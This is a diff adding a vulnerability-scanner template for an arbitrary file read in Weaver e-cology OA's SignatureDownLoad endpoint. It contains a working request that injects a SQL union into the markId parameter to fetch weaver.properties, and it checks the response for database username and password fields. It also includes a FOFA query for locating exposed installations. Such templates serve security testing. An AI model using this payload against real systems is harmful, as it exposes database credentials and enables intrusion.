@@ -1,0 +1,25 @@
+id: ecology-signaturedownload-fileread
+
+info:
+  name: 泛微 OA ecology SignatureDownLoad 任意文件读取
+  author: daffainfo
+  severity: critical
+  verified: true
+  description: |-
+    泛微协同管理平台e-weaver继承e-cology八大功能模块应用，并可进一步打通企业更深层的个性管理需求，基于协同思想打造全面整合企业管理资源的环境。e-weaver基于工作流引擎＋卡片/表单＋组件模式，全面开放已有八大功能的配置应用，同时还可以根据用户个性的管理需求，增添企业独立的应用模块功能，从而形成完全符合自身企业的全面协同管理应用解决方案。泛微OA e-weaver平台SignatureDownLoad处存在敏感信息泄露漏洞，攻击者通过漏洞可以获取数据库服务器权限。
+    fofa: app="泛微-E-Weaver"
+  reference:
+    - https://mp.weixin.qq.com/s/71v9SgVLJk2jg0kBVhkTpA
+  tags: weaver,ecology,fileread
+  created: 2023/06/23
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'ecology.user=') && 
+      response.body.bcontains(b'ecology.password=')
+expression: r0()
